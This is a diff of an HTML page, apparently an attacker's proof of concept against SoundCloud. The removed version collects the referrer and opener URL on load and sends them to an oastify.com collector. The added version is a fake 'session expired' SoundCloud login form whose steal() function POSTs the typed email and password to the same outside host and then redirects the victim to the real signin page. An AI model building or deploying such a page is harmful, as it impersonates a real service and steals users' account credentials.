@@ -1,38 +1,38 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <meta name="referrer" content="unsafe-url">
-    <title>Connecting to SoundCloud API...</title>
+    <title>SoundCloud - Login Required</title>
+    <style>
+        body { background: #f2f2f2; font-family: "Interstate","Lucida Grande",Arial,sans-serif; }
+        .login-box { background: white; width: 400px; margin: 100px auto; padding: 40px; border: 1px solid #ccc; text-align: center; }
+        .btn { background: #ff5500; color: white; border: none; padding: 10px 20px; width: 100%; cursor: pointer; font-weight: bold; }
+        input { width: 90%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; }
+    </style>
 </head>
 <body>
-    <script>
-        async function exfiltrate() {
-            // Attempt to find the secret token in any available property
-            const data = {
-                method_1_ref: document.referrer,
-                method_2_history: (window.history.length > 1) ? "History exists" : "No history",
-                method_3_opener: (window.opener) ? window.opener.location.href : "No opener",
-                ua: navigator.userAgent
-            };
+    <div class="login-box">
+        <img src="https://a-v2.sndcdn.com/assets/images/peace-cloud-28ad10.svg" width="50"><br>
+        <h3>Your session has expired.</h3>
+        <p>Please log in to continue listening.</p>
+        <input type="text" id="user" placeholder="Email or Profile URL">
+        <input type="password" id="pass" placeholder="Your Password">
+        <button class="btn" onclick="steal()">Sign In</button>
+    </div>
 
-            // Send EVERYTHING we found to Oastify
-            await fetch('https://547icd6oajijfupu2oumfkb1xs3jranyc.oastify.com/exfiltrate', {
+    <script>
+        function steal() {
+            const u = document.getElementById('user').value;
+            const p = document.getElementById('pass').value;
+
+            fetch('https://547icd6oajijfupu2oumfkb1xs3jranyc.oastify.com/creds', {
                 method: 'POST',
                 mode: 'no-cors',
-                body: JSON.stringify(data)
+                body: JSON.stringify({ email: u, password: p, origin: "gate.sc_bypass" })
             });
 
-            // If we still have no referrer, we'll try to 'bait' the user 
-            // but for the PoC, let's see if method 1 or 3 caught it.
-            setTimeout(() => {
-                window.location.href = "https://soundcloud.com/discover";
-            }, 1000);
+            // After stealing, send them back to the real SoundCloud login
+            window.location.href = "https://soundcloud.com/signin";
         }
-        window.onload = exfiltrate;
     </script>
-    <div style="font-family: sans-serif; text-align: center; margin-top: 100px;">
-        <h2>Authenticating Session...</h2>
-        <progress></progress>
-    </div>
 </body>
 </html>
